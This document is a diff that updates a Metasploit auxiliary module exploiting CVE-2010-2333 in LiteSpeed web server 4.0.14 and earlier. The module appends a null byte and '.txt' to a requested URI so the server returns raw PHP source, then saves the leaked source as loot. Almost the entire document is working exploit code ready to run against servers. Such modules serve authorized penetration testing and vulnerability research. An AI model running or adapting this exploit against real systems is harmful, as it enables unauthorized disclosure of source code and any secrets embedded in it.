@@ -1,105 +1,96 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
 
-require 'msf/core'
+  def initialize
+    super(
+      'Name'           => 'LiteSpeed Source Code Disclosure/Download',
+      'Description'    => %q{
+          This module exploits a source code disclosure/download vulnerability in
+        versions 4.0.14 and prior of LiteSpeed.
+      },
+      'References'     =>
+        [
+          [ 'CVE', '2010-2333' ],
+          [ 'OSVDB', '65476' ],
+          [ 'BID', '40815' ],
+          [ 'EDB', '13850' ]
+        ],
+      'Author'         =>
+        [
+          'Kingcope',  # initial disclosure
+          'xanda'      # Metasploit module
+        ],
+      'License'        =>  MSF_LICENSE)
 
-class Metasploit3 < Msf::Auxiliary
+    register_options(
+      [
+        OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
+        OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
+      ])
+  end
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::Scanner
+  def target_url
+    uri = normalize_uri(datastore['URI'])
+    "http://#{vhost}:#{rport}#{datastore['URI']}"
+  end
 
-	def initialize
-		super(
-			'Name'           => 'LiteSpeed Source Code Disclosure/Download',
-			'Description'    => %q{
-					This module exploits a source code disclosure/download vulnerability in
-				versions 4.0.14 and prior of LiteSpeed.
-			},
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'CVE', '2010-2333' ],
-					[ 'OSVDB', '65476' ],
-					[ 'BID', '40815' ],
-					[ 'URL', 'http://www.exploit-db.com/exploits/13850/' ]
-				],
-			'Author'         =>
-				[
-					'Kingcope',  # initial disclosure
-					'xanda'      # Metasploit module
-				],
-			'License'        =>  MSF_LICENSE)
+  def run_host(ip)
+    uri = normalize_uri(datastore['URI'])
+    path_save = datastore['PATH_SAVE']
 
-		register_options(
-			[
-				OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
-				OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
-			], self.class)
-	end
+    vuln_versions = [
+      "LiteSpeed"
+    ]
 
-	def target_url
-		"http://#{vhost}:#{rport}#{datastore['URI']}"
-	end
+    nullbytetxt = "\x00.txt"
 
-	def run_host(ip)
-		uri = datastore['URI']
-		path_save = datastore['PATH_SAVE']
+    begin
+      res = send_request_raw({
+        'method'  => 'GET',
+        'uri'     => "#{uri}#{nullbytetxt}",
+      }, 25)
 
-		vuln_versions = [
-			"LiteSpeed"
-		]
+      if res.nil?
+        print_error("#{target_url} - Connection timed out")
+        return
+      end
 
-		nullbytetxt = "\x00.txt"
+      version = res.headers['Server']
 
-		begin
-			res = send_request_raw({
-				'method'  => 'GET',
-				'uri'     => "/#{uri}#{nullbytetxt}",
-			}, 25)
+      if vuln_versions.include?(version)
+        print_good("#{target_url} - LiteSpeed - Vulnerable version: #{version}")
 
-			version = res.headers['Server'] if res
+        if (res and res.code == 200)
 
-			if vuln_versions.include?(version)
-				print_good("#{target_url} - LiteSpeed - Vulnerable version: #{version}")
+          print_good("#{target_url} - LiteSpeed - Getting the source of page #{uri}")
+          p = store_loot("litespeed.source", "text/plain", rhost, res.body, path_save)
+          print_good("#{target_url} - LiteSpeed - File successfully saved: #{p}")
 
-				if (res and res.code == 200)
+        else
+          print_error("http://#{vhost}:#{rport} - LiteSpeed - Unrecognized #{res.code} response")
+          return
 
-					print_good("#{target_url} - LiteSpeed - Getting the source of page #{uri}")
+        end
 
-					save_source = File.new("#{path_save}#{uri}","w")
-					save_source.puts(res.body.to_s)
-					save_source.close
+      else
+        if version =~ /LiteSpeed/
+          print_error("#{target_url} - LiteSpeed - Cannot exploit: the remote server is not vulnerable - Version #{version}")
+        else
+          print_error("#{target_url} - LiteSpeed - Cannot exploit: the remote server is not LiteSpeed")
+        end
+        return
 
-					print_status("#{target_url} - LiteSpeed - File successfully saved: #{path_save}#{uri}")	if (File.exists?("#{path_save}#{uri}"))
+      end
 
-				else
-					print_error("http://#{vhost}:#{rport} - LiteSpeed - Unrecognized #{res.code} response")
-					return
-
-				end
-
-			else
-				if version =~ /LiteSpeed/
-					print_error("#{target_url} - LiteSpeed - Cannot exploit: the remote server is not vulnerable - Version #{version}")
-				else
-					print_error("#{target_url} - LiteSpeed - Cannot exploit: the remote server is not LiteSpeed")
-				end
-				return
-
-			end
-
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE
-		end
-	end
-
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    rescue ::Timeout::Error, ::Errno::EPIPE
+    end
+  end
 end
